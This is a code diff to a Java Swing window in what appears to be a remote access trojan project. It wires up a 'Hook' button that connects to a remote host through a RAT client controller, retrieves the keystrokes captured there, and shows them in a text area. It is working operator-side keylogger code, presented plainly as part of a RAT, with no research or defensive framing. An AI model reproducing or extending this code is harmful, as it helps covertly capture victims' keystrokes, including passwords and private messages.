@@ -4,6 +4,11 @@
  */
 package views;
 
+import controllers.RATClientCtr;
+import java.util.ArrayList;
+import javax.swing.JOptionPane;
+import static views.MainScr.host;
+
 /**
  *
  * @author BLUECORN
@@ -13,9 +18,12 @@ public class Keystoke extends javax.swing.JFrame {
     /**
      * Creates new form Process
      */
-    public Keystoke() {
+    public Keystoke(String host) {
         initComponents();
+        IP = host;
     }
+    
+    public static String IP;
 
     /**
      * This method is called from within the constructor to initialize the form.
@@ -31,7 +39,8 @@ public class Keystoke extends javax.swing.JFrame {
         PrintkeyBtn = new javax.swing.JButton();
         DeleteBtn = new javax.swing.JButton();
         BackBtn = new javax.swing.JButton();
-        jLabel1 = new javax.swing.JLabel();
+        jScrollPane1 = new javax.swing.JScrollPane();
+        jTextArea1 = new javax.swing.JTextArea();
 
         setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
         setTitle("ListApp");
@@ -66,8 +75,9 @@ public class Keystoke extends javax.swing.JFrame {
             }
         });
 
-        jLabel1.setText("Note");
-        jLabel1.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 0, 0)));
+        jTextArea1.setColumns(20);
+        jTextArea1.setRows(5);
+        jScrollPane1.setViewportView(jTextArea1);
 
         javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
         getContentPane().setLayout(layout);
@@ -76,7 +86,7 @@ public class Keystoke extends javax.swing.JFrame {
             .addGroup(layout.createSequentialGroup()
                 .addContainerGap()
                 .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
-                    .addComponent(jLabel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
+                    .addComponent(jScrollPane1)
                     .addGroup(layout.createSequentialGroup()
                         .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                             .addGroup(layout.createSequentialGroup()
@@ -96,8 +106,8 @@ public class Keystoke extends javax.swing.JFrame {
             layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
             .addGroup(layout.createSequentialGroup()
                 .addComponent(BackBtn)
-                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
-                .addComponent(jLabel1, javax.swing.GroupLayout.PREFERRED_SIZE, 399, javax.swing.GroupLayout.PREFERRED_SIZE)
+                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
+                .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 393, javax.swing.GroupLayout.PREFERRED_SIZE)
                 .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                 .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                     .addComponent(DeleteBtn, javax.swing.GroupLayout.PREFERRED_SIZE, 56, javax.swing.GroupLayout.PREFERRED_SIZE)
@@ -116,6 +126,29 @@ public class Keystoke extends javax.swing.JFrame {
 
     private void HookBtnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_HookBtnActionPerformed
         // TODO add your handling code here:
+        if(host.isEmpty()) {
+            JOptionPane.showMessageDialog(rootPane, "Not connected!");
+        }else {
+            try {
+                RATClientCtr.ConnectionCtr(host);
+                String res = RATClientCtr.getConnectRes();
+                if(res.equals("ok")) {
+                    ArrayList<Character> key = new ArrayList<Character>();
+                    RATClientCtr.getKey(key);
+                    for(int i = 0; i < key.size(); i++) {
+                        jTextArea1.append(key.get(i).toString());
+                    }
+                    
+                    //System.out.println(RATClientCtr.getCommandRes());
+                    JOptionPane.showMessageDialog(rootPane, "Success!");
+                }else {
+                    JOptionPane.showMessageDialog(rootPane, "Fail!");
+                }
+              RATClientCtr.closeConn();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
     }//GEN-LAST:event_HookBtnActionPerformed
 
     private void UnhookBtnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_UnhookBtnActionPerformed
@@ -173,6 +206,7 @@ public class Keystoke extends javax.swing.JFrame {
     private javax.swing.JButton HookBtn;
     private javax.swing.JButton PrintkeyBtn;
     private javax.swing.JButton UnhookBtn;
-    private javax.swing.JLabel jLabel1;
+    private javax.swing.JScrollPane jScrollPane1;
+    private javax.swing.JTextArea jTextArea1;
     // End of variables declaration//GEN-END:variables
 }
